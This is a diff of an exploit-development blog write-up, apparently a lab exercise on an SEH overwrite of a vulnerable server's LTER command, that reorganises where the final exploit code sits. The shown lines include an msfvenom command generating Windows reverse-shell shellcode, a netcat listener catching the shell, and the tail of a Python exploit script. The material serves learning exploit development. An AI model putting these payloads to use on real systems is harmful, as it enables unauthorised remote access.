@@ -752,7 +752,39 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.206 LPORT=443 -f c -b '\x0
 
 And then fed this shellcode to Slink. There are a few different ways to get only the shellcode out of the Slink output, I used bash for the most part.
 
-Our final exploit code looks like this now:
+I decided to place the final exploit code at the very bottom of this post since it is obnoxiously long. (Shellcode encoded was over 2200 bytes). 
+
+Adding our shellcode to our exploit code nets us our reverse shell! Whoohoo!
+```terminal_session
+astrid:~/ # nc -lvp 443                                                                                                                
+listening on [any] 443 ...
+192.168.1.201: inverse host lookup failed: Unknown host
+connect to [192.168.1.206] from (UNKNOWN) [192.168.1.201] 49422
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\IEUser\Desktop>
+```
+
+## End Game
+
+What a journey that was. To summarize I made a little diagram of what happened at a high level. 
+
+![](/assets/images/CTP/endgame.JPG)
+
+## Big Thanks
+
+To everyone who has published free intro-level 32 bit exploit dev material, I’m super appreciative. Truly mean it.
+
+## Resources
++ [OffSec Alphanumeric Shellcode](https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/)
++ [Corelan Mona Tutorial](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)
++ [Doyler LTER SEH Overwrite Part 1](https://www.doyler.net/security-not-included/lter-seh-continued)
++ [Doyler LTER SEH Overwrite Part 2](https://www.doyler.net/security-not-included/lter-seh-continued)
++ [VelloSec Carving Shellcode](http://vellosec.net/2018/08/carving-shellcode-using-restrictive-character-sets/)
++ [Slink by @ihack4falafel](https://github.com/ihack4falafel/Slink)
+
+## Final Exploit Code
 ```python
 #!/usr/bin/python
 
@@ -1325,35 +1357,3 @@ s.send("LTER /.../" + buffer)
 print s.recv(1024)
 s.close()
 ```
-
-This nets us our reverse shell! Whoohoo!
-```terminal_session
-astrid:~/ # nc -lvp 443                                                                                                                
-listening on [any] 443 ...
-192.168.1.201: inverse host lookup failed: Unknown host
-connect to [192.168.1.206] from (UNKNOWN) [192.168.1.201] 49422
-Microsoft Windows [Version 6.1.7601]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-
-C:\Users\IEUser\Desktop>
-```
-
-## End Game
-
-What a journey that was. To summarize I made a little diagram of what happened at a high level. 
-
-![](/assets/images/CTP/endgame.JPG)
-
-
-
-
-
-
-
-
-
--- TO BE CONTINUED... --
-
-## Resources
-+ [OffSec Alphanumeric Shellcode](https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/)
-+ [Corelan Mona Tutorial](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)
